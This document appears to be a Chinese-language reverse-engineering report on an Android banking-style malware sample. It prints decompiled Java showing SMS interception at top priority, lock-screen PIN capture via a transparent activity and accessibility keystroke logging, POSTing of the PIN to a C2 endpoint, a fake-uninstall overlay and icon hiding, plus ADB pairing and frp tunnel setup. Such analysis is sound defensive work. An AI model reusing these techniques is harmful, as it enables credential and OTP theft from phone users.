# Vendor 自动化脚本执行完成后完整执行链路分析

> **样本**: update.apk 
> **核心文件**: `jadx-reference/rock/service/modules/C0329b4.java` (obzzniixzpin 授权编排器)
> **主服务**: `jadx-reference/rock/service/dqtvuisjd.java` (AccessibilityService 主类)
> **PIN 捕获**: `jadx-reference/rock/activity/syuqattwmgit.java` + `jadx-reference/rock/service/modules/cipher/C0335a1.java`
> **假卸载**: `jadx-reference/p000/cm0.java` + `jadx-reference/p000/bm0.java`
> **日期**: 2026-04-19

---

## 一、结论先行

yw5xud 厂商权限自动化完成后， 并不立即进入 ADB 配对。中间还有 **4 个关键步骤**：

```
yw5xud 权限自动化完成
    │
    ├─ 1. 标记授权完成 + postAuthorizationInit（注册延迟组件）
    │     ├─ 屏幕状态广播接收器
    │     ├─ 短信拦截器（MAX_VALUE 优先级）
    │     ├─ 短信数据库 ContentObserver
    │     └─ local-service 广播接收器
    │
    ├─ 2. 锁屏密码/PIN 捕获（syuqattwmgit Activity）
    │     ├─ BiometricPrompt / KeyguardManager
    │     ├─ CipherCaptureManager 监听键盘输入
    │     └─ 上传到 /api/sync/cipher
    │
    ├─ 3. 假卸载对话框（PkgVerifyOverlay）
    │     ├─ 全屏覆盖层模拟"应用已卸载"
    │     └─ 隐藏 APP 图标（setComponentEnabledSetting → DISABLED）
    │
    └─ 4. OpenDevelopmentDelegate → ADB 配对 → local-service 部署
```


---

## 二、完整执行链（代码级还原）

### 阶段 0：yw5xud 权限自动化完成

**文件**: `C0329b4.java` (obzzniixzpin)
**入口方法**: `m211762a0()` (行 85)

```java
// 授权成功回调
public static final void m211762a0(C0329b4 c0329b4, C0147bu c0147bu) {
    if (c0147bu.f46000a0) {
        AbstractC0003a2.m44c5("授权成功: ", c0147bu.f46001a1.size(), "个流程完成", "obzzniixzpin");
        return;
    }
    t60.m214726f4("obzzniixzpin", "⚠️ 设备授权配置部分失败");
    t60.m214726f4("obzzniixzpin", "❌ 授权失败的项目: " + ...);
}
```

授权成功后触发 `m211767a5()` (行 169)：

```java
public final void m211767a5() {
    t60.m214714d6("obzzniixzpin", "★★★ 授权流程结束，启动延迟初始化 + 配对流程 ★★★");
    // 1. 标记授权完成
    getSharedPreferences("app_state").putBoolean("authorization_completed", true);
    // 2. postAuthorizationInit — 注册延迟组件
    this.f53195a0.m211504j8();
    // 3. 触发下一阶段（密码捕获 → 假卸载 → 配对）
    new Handler(Looper.getMainLooper()).post(new RunnableC0941o6(23, this));
}
```

**品牌标识 `m211765a3()`** (行 120)：根据 `Build.BRAND` / `Build.MANUFACTURER` 判定品牌并存储到 `authorization_brand` 字段，覆盖：vivo/iqoo, oppo, honor/hihonor, xiaomi/redmi, oneplus, huawei, samsung, realme。

---

### 阶段 1：postAuthorizationInit — 注册延迟组件

**文件**: `dqtvuisjd$postAuthorizationInit$1.java`
**方法**: `invokeSuspend()` (行 40-64)

授权完成后立即注册 4 个延迟组件：

```java
t60.m214714d6("dqtvuisjd", "🔧 [授权后初始化] 开始注册延迟组件...");
// 组件 1: 屏幕状态广播接收器
dqtvuisjd.m211420b9(dqtvuisjdVar);
// 组件 2: 短信拦截器
dqtvuisjd.m211421c0(dqtvuisjdVar);
// 组件 3: 短信数据库 ContentObserver
dqtvuisjdVar.m211506k2();
// 组件 4: local-service 广播接收器
dqtvuisjd.m211418b7(dqtvuisjdVar);
```

#### 1.1 屏幕状态广播接收器 (`m211420b9`, 行 2937)

```java
IntentFilter intentFilter = new IntentFilter();
intentFilter.addAction("android.intent.action.SCREEN_ON");
intentFilter.addAction("android.intent.action.SCREEN_OFF");
intentFilter.addAction("android.intent.action.USER_PRESENT");
registerReceiver(screenStateReceiver, intentFilter);
```

**用途**：监控屏幕亮灭状态，为后续截屏、黑屏遮盖、密码输入时机判断提供信号。

#### 1.2 短信拦截器 (`m211421c0`, 行 2957)

```java
// 关键：优先级设为 Integer.MAX_VALUE
IntentFilter intentFilter = new IntentFilter();
intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
intentFilter.addAction("android.provider.Telephony.SMS_DELIVER");
intentFilter.setPriority(Integer.MAX_VALUE);  // ← 抢先于所有其他应用
// Android 13+ 使用 RECEIVER_EXPORTED
registerReceiver(new arniezsqllm(), intentFilter, RECEIVER_EXPORTED);
```

**用途**：拦截验证码短信（银行 OTP、二次验证等）。`Integer.MAX_VALUE` 优先级确保 在所有应用之前收到短信。

#### 1.3 短信数据库 ContentObserver (`m211506k2`, 行 7540)

**用途**：监听 `content://sms` 数据库变化，记录最新短信 ID 基线，后续检测新短信到达。

#### 1.4 local-service 广播接收器 (`m211418b7`, 行 2817)

```java
// 监听 ACTION_KEEP_ALIVE 广播
if (action.equals(packageName + ".ACTION_KEEP_ALIVE")) {
    t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到 KEEP_ALIVE 广播");
}
```

**用途**：接收 Go local-service 的心跳广播，维持 Java 层与 Go 层的联动。

---

### 阶段 2：锁屏密码/PIN

**文件**: `dqtvuisjd.java` 方法 `m211457e6()` (行 4873) + `syuqattwmgit.java`


#### 2.1 启动系统密码验证 Activity

```java
// dqtvuisjd.java 行 4873
public final void m211457e6(final boolean z) {
    t60.m214714d6("dqtvuisjd", "🔐 启动系统真实密码验证... (第" + (this.f52485l6 + 1) + "次)");
    // 初始化密码捕获管理器
    C0335a1.m211788c1(c0335a1);
    t60.m214714d6("dqtvuisjd", "✅ CipherCaptureManager 密码监听已启用");
    // 设置回调
    syuqattwmgit.f51917a3.setOnCredentialVerified(callback);
    // 启动透明 Activity
    Intent intent = new Intent(this, syuqattwmgit.class);
    intent.putExtra("credential_type", 0);
    intent.addFlags(805306368);  // FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP
}
```

#### 2.2 syuqattwmgit — 透明密码验证 Activity

**文件**: `jadx-reference/rock/activity/syuqattwmgit.java`

```java
// onCreate (行 210-248)
// 创建 1x1 像素的透明窗口
View view = new View(this);
setContentView(view);
WindowManager.LayoutParams attributes = getWindow().getAttributes();
attributes.dimAmount = 0.0f;   // 无暗化
attributes.width = 1;          // 1px 宽
attributes.height = 1;         // 1px 高
attributes.gravity = 8388661;  // TOP|START
getWindow().getDecorView().setBackgroundColor(0);  // 完全透明
```

**文本**（两种模式）：

```java
// m211192a1 (行 131-133)
// 模式 0 (应用验证):
title = "Verify personal identity"
subtitle = "Privacy protection"
description = "To protect your privacy, please enter your lock screen
              password to verify that you are the one making the operation."

// 模式 1 (系统更新):
title = "Verify lock screen password"
subtitle = "Fix system security vulnerabilities"
description = "Please enter your lock screen password to complete the
              system update and fix security vulnerabilities."
```

**认证方式选择**：

| Android 版本 | 认证 API | 方法 |
|---|---|---|
| API 30+ (Android 11+) | `BiometricPrompt` | `m211193a2()` (行 136) |
| API < 30 | `KeyguardManager.createConfirmDeviceCredentialIntent` | `m211194a3()` (行 166) |

**关键**： Android 系统真实的认证 API——`BiometricPrompt` 和 `KeyguardManager`。用户看到的是**系统原生的密码输入界面**，不是仿冒 UI。区别在于 同时启用了 `CipherCaptureManager` 在无障碍层监听键盘输入

#### 2.3 管理器 (CipherCaptureManager)

**文件**: `jadx-reference/rock/service/modules/cipher/C0335a1.java`

`CipherCaptureManager` 在 `syuqattwmgit` 启动时通过 `m211788c1()` 进入监听模式：
- 监听 `AccessibilityEvent` 中的 `TYPE_VIEW_TEXT_CHANGED` 事件
- 捕获密码输入框中的每个字符
- 通过 `m211819d0(false)` 获取文本密码，`m211819d0(true)` 获取图案密码

#### 2.4 密码验证回调

```java
// dqtvuisjd.java 行 4896-4964
public final Object invoke(Object obj) {
    boolean zBooleanValue = ((Boolean) obj).booleanValue();
    if (zBooleanValue) {
        // 成功路径
        dqtvuisjdVar.f52474k5 = false;  // 停止重试
        this.f52485l6 = 0;
        // 获取捕获的密码
        C0598hx cipher = c0335a1.m211819d0(false);  // 文本密码
        if (cipher == null) {
            cipher = c0335a1.m211819d0(true);  // 图案密码
        }
        // 上传到服务器
        this.m211533n1(cipher);
        // 进入下一阶段
        if (isInstallationFlow) {
            this.m211449d4();  // → completeInstallationWithCipher
        }
    } else {
        // 失败路径 — 重试
        this.f52485l6++;
        if (retryCount < maxRetries) {
            handler.postDelayed(retry, delay);  // 800ms 后重新弹出
        }
    }
}
```

**重试机制**：
- 默认重试上限由 `f52486l7` 控制
- 每次重试间隔 `f52487l8` 毫秒（默认 800ms）
- 达到上限后仍会调用 `completeInstallationWithCipher()` 继续流程（即使未获取密码）

#### 2.5 completeInstallationWithCipher — 密码上传与安装完成

**方法**: `m211449d4()` (行 4647)

```java
t60.m214714d6("dqtvuisjd", "🔐 ★★★ completeInstallationWithCipher() 被调用 ★★★");
// 1. 标记完成状态
getSharedPreferences("app_state").putBoolean("cipher_excluded", true);
getSharedPreferences("cipher_config").putBoolean("cipher_completed", true);

// 2. 分类密码类型
if (list != null) {
    str = "pattern";          // 图案密码
} else if (str2.length() <= 4) {
    str = "4pin";             // 4 位 PIN
} else if (str2.length() <= 6) {
    str = "6pin";             // 6 位 PIN
} else {
    str = "mixed";            // 混合密码
}

// 3. 存储并上传
C0107as.f45610a3.getInstance(this).m210507a6(str, true, strM213295i2);

// 4. 进入下一阶段 → 假卸载
m211534n2();
```

**PIN 上传到服务器**（`dqtvuisjd$saveLockPinToServer$1.java`, 行 64-93）：

```java
// 构造 JSON
JSONObject json = new JSONObject();
json.put("cipherGradeCode", gradeCode);
json.put("textCipher", pin);
json.put("patternCipher", pattern);
json.put("isLocked", true);
json.put("captureTime", System.currentTimeMillis());

// HTTP POST 到 C2
// URL: {serverUrl}/api/sync/cipher
// Headers: X-Client-ID
// Content-Type: application/json
```

---

### 阶段 3：卸载对话框 (PkgVerifyOverlay)

**方法**: `m211534n2()` (行 9587)


#### 3.1 触发条件

```java
t60.m214714d6("dqtvuisjd", "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★");
// 读取配置
JSONObject config = AbstractC0765ko.m213605a3(this);
boolean uninstallMode = config.optBoolean("uninstallMode", false);
if (!uninstallMode) {
    t60.m214714d6("dqtvuisjd", "📦 [假卸载] uninstallMode 未启用，跳过");
    return;
}
// 检查是否已弹过
boolean done = getSharedPreferences("pkg_verify_state", 0).getBoolean("v_done", false);
if (done) {
    t60.m214714d6("dqtvuisjd", "📦 [假卸载] 已弹出过，跳过");
    return;
}
```

**条件**：
1. 配置文件 `uninstallMode` 为 true（C2 可远程控制）
2. 尚未弹出过（`pkg_verify_state.v_done` == false）

#### 3.2 覆盖层显示策略

`PkgVerifyOverlay` 有 **3 种覆盖层策略**，按优先级降级：

| 策略 | Window Type | 名称 | 需要权限 |
|---|---|---|---|
| 0 | 2032 | 无障碍覆盖层 | 无障碍服务（已有）|
| 1 | 2038 | 应用悬浮窗 | SYSTEM_ALERT_WINDOW |
| 2 | 2003/2038 | 系统弹窗 | SYSTEM_ALERT_WINDOW |

```java
// bm0.java 行 73-83 — 策略选择
int i2 = cm0.f46154a4;  // 当前策略序号
int windowType = 2032;   // 默认无障碍覆盖层
if (i2 == 1) windowType = 2038;      // 应用悬浮窗
if (i2 == 2 && SDK < 26) windowType = 2003;  // 旧版系统弹窗
```

**每种策略最多重试 2 次**，失败后自动切换下一策略。3 种策略全部失败才放弃。

#### 3.3 覆盖层 UI 构建

**文件**: `cm0.java` 方法 `m210865a0()` (行 58)

覆盖层 UI 按品牌定制颜色：

| 品牌 | 主色值 |
|---|---|
| 华为/荣耀 | `#CE0E2D` (红) |
| 小米/Redmi/POCO | `#FF6900` (橙) |
| OPPO/Realme/OnePlus | `#1B8CFE` (蓝) |
| vivo/iQOO | `#415FFF` (紫蓝) |
| 三星 | `#1259C3` (深蓝) |
| 其他 | `#4285F4` (Google 蓝) |

UI 内容：
- 获取 APP 真实图标 (`getApplicationIcon`)
- 获取 APP 真实名称 (`getApplicationLabel`)
- 获取版本号 (`versionName`)
- 全屏 ScrollView + 模拟系统卸载确认页面

#### 3.4 关键后续动作：隐藏图标

```java
// bm0.java 行 98-99 — 显示成功后
dqtvuisjdVar.getSharedPreferences("pkg_verify_state", 0)
    .edit().putBoolean("v_done", true).apply();
cm0.m210869a4(dqtvuisjdVar);  // ← hideIcon()
```

**`hideIcon()` 实现** (`cm0.java` 行 257-279):

```java
// 方案 1: 通过 dqtvuisjd 隐藏
c0328b3.m211758a2(true);

// 方案 2: 回退方式 — 直接禁用 Launcher alias
dqtvuisjdVar.getPackageManager().setComponentEnabledSetting(
    new ComponentName(dqtvuisjdVar, DefaultLauncherAlias.class),
    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  // ← 禁用
    PackageManager.DONT_KILL_APP
);
getSharedPreferences("app_state").putBoolean("icon_hidden", true);
```

**效果**：APP 图标从桌面 Launcher 消失。

---

### 阶段 4：OpenDevelopmentDelegate → ADB 配对 → 部署

此阶段已在 `ADB WiFi配对机制深度分析.md` 和 `ADB 配对自动化触发条件分析.md` 中详细分析。

简要流程：
1. **OpenDevelopmentDelegate** — 自动化开启开发者选项（点击版本号 7 次）
2. **startPairFlow()** — 进入无线调试 → 配对码读取 → SPAKE2+TLS 握手
3. **部署 local-service** — 下载/解压 Go 二进制 → ADB push → 启动
4. **frpc 隧道** — 下载加密 frpc → XOR 解密 → 建立反向隧道

---

## 三、完整执行时间线

```
T+0s      用户开启无障碍服务
T+1s      yw5xud 权限自动化启动（按品牌分发）
T+30s     批量运行时权限授予完成
T+60s     电池/自启动/悬浮窗/文件/通知等权限完成
T+65s     ★ 授权完成 → postAuthorizationInit
          ├─ 注册屏幕状态接收器
          ├─ 注册短信拦截器（MAX_VALUE 优先级）
          ├─ 注册短信 ContentObserver
          └─ 注册 local-service 广播接收器
T+70s     ★ 弹出系统密码验证（syuqattwmgit）
          └─ 用户看到系统原生的"验证身份"对话框
T+80s     用户输入密码 → CipherCaptureManager 捕获
T+82s     密码上传到 /api/sync/cipher
T+85s     ★ completeInstallationWithCipher
T+86s     ★ 假卸载页面显示（PkgVerifyOverlay）
          └─ 用户看到"应用已卸载"全屏覆盖
T+87s     APP 图标从桌面消失（hideIcon）
T+90s     ★ OpenDevelopmentDelegate 启动
          └─ 自动化开启开发者选项
T+100s    连续点击版本号 7 次 → 开发者选项启用
T+115s    onComplete → startPairFlow()
T+120s    进入无线调试 → 点击"使用配对码配对设备"
T+125s    读取配对码 → SPAKE2+TLS 握手
T+130s    配对成功 → 证书上传
T+135s    部署 local-service → 启动
T+140s    frpc 下载 → XOR 解密 → 隧道建立
T+150s    ★★★ 完全部署 ★★★
          ├─ 图标已隐藏
          ├─ 锁屏密码已获取
          ├─ 短信已拦截
          ├─ ADB shell 已获取
          ├─ local-service RPC 已运行
          └─ frp 反向隧道已建立
```

**总耗时约 2.5-5 分钟，全程自动，仅需用户开启无障碍 + 输入一次密码。**

---

## 四、各阶段 SharedPreferences 状态标记

| SharedPreferences 文件 | Key | 设置时机 | 含义 |
|---|---|---|---|
| `authorization` | `authorization_completed` | 阶段 0 完成 | yw5xud 权限自动化已完成 |
| `authorization` | `authorization_brand` | 阶段 0 完成 | 品牌标识（vivo/oppo/huawei...） |
| `authorization` | `authorization_time` | 阶段 0 完成 | 授权完成时间戳 |
| `app_state` | `authorization_completed` | 阶段 0 完成 | 冗余标记（双写） |
| `app_state` | `cipher_excluded` | 阶段 2 完成 | 密码捕获已完成 |
| `cipher_config` | `cipher_completed` | 阶段 2 完成 | 密码已存储 |
| `pkg_verify_state` | `v_done` | 阶段 3 完成 | 假卸载页面已弹出 |
| `app_state` | `icon_hidden` | 阶段 3 完成 | 图标已隐藏 |
| `system_optimize` | `pair_completed` | 阶段 4 完成 | ADB 配对已完成 |
| `system_optimize` | `adb_deploy_enabled` | 阶段 4 完成 | local-service 已部署 |

---

## 五、API 端点汇总（阶段 1-3 新增）

| 端点 | 方法 | 阶段 | 用途 |
|---|---|---|---|
| `/api/sync/cipher` | POST | 2 | 上传锁屏密码/PIN |
| `/api/sync/credentials` | POST | — | 上传应用凭证（已在通信审计中覆盖） |
| — | Broadcast | 1 | `ACTION_KEEP_ALIVE` local-service 心跳 |
| — | ContentObserver | 1 | `content://sms` 短信监控 |

---

## 六、关键设计分析

### 6.1 为什么先窃取密码再假卸载？

顺序不是随意的：

1. **先窃取密码**：用户此时认为 APP 正常运行（还能看到图标），对"验证身份"弹窗的警惕性较低
2. **再假卸载**：密码已获取后，进入隐身模式。即使用户之后怀疑，也找不到 APP
3. **最后 ADB 配对**：隐身状态下的操作不会被用户注意到

### 6.2 密码捕获的精妙之处

- **使用系统原生 API**：`BiometricPrompt` / `KeyguardManager` 是 Android 官方认证 API，弹出的是系统真实的密码输入界面（不是仿冒 UI）
- **社会工程文本**：`"为保护您的隐私，请输入锁屏密码验证"` — 合理的理由让用户配合
- **透明 Activity**：syuqattwmgit 本身是 1×1px 透明窗口，用户只看到系统弹出的密码验证框
- **侧信道捕获**：密码不是从 BiometricPrompt 回调获取（回调只返回 success/fail），而是通过 `CipherCaptureManager` 在无障碍层监听 `TYPE_VIEW_TEXT_CHANGED` 事件捕获键盘输入

### 6.3 假卸载的 3 策略降级

| 顺序 | 策略 | 条件 | Window Type |
|---|---|---|---|
| 1 | 无障碍覆盖层 | 无条件（已有无障碍权限） | 2032 (TYPE_ACCESSIBILITY_OVERLAY) |
| 2 | 应用悬浮窗 | 需要 SYSTEM_ALERT_WINDOW | 2038 (TYPE_APPLICATION_OVERLAY) |
| 3 | 系统弹窗 | 需要 SYSTEM_ALERT_WINDOW | 2003/2038 |

策略 1 最可靠（不需要额外权限），但某些厂商可能限制无障碍覆盖层。策略 2/3 是回退方案。

### 6.4 短信拦截的激进策略

```java
intentFilter.setPriority(Integer.MAX_VALUE);  // 2147483647
```

这是 Android 允许的最高优先级。配合 `SMS_RECEIVED` + `SMS_DELIVER` 双监听：
- `SMS_RECEIVED`：标准短信接收广播
- `SMS_DELIVER`：只有默认短信应用才能收到的广播

这意味着 可以在所有应用（包括默认短信应用）之前拦截短信，甚至可以 `abortBroadcast()` 阻止其他应用收到短信（如银行验证码）。

---

## 九、总结图

```
用户开启无障碍
      │
      ▼
┌─────────────────┐
│ 阶段 0          │ yw5xud 按厂商权限自动化
│ ~60s            │ （华为/OPPO/vivo/小米/三星/魅族/通用）
│                 │ → 悬浮窗/自启动/电池/文件/通知/最近任务
└────────┬────────┘
         │ "★★★ 授权流程结束 ★★★"
         ▼
┌─────────────────┐
│ 阶段 1          │ postAuthorizationInit
│ ~5s             │ → 屏幕监控 + 短信拦截 + SMS Observer + local-service 广播
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 阶段 2          │ 锁屏密码捕获（syuqattwmgit）
│ ~15s            │ → BiometricPrompt/KeyguardManager 系统原生界面
│                 │ → CipherCaptureManager 侧信道监听
│                 │ → POST /api/sync/cipher 上传密码
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 阶段 3          │ 假卸载 + 图标隐藏
│ ~2s             │ → PkgVerifyOverlay 全屏覆盖层
│                 │ → hideIcon() 禁用 DefaultLauncherAlias
│                 │ → 用户以为 APP 已卸载
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 阶段 4          │ 开发者选项 → ADB 配对 → 部署
│ ~60s            │ → OpenDevelopmentDelegate 点击版本号 7 次
│                 │ → SPAKE2+TLS ADB WiFi 配对
│                 │ → local-service + frpc 部署
└────────┬────────┘
         │
         ▼
   ★★★ 完全部署 ★★★
   ├─ 图标已隐藏
   ├─ 密码已窃取
   ├─ 短信已拦截
   ├─ ADB shell 已获取
   └─ frp 隧道已建立
```
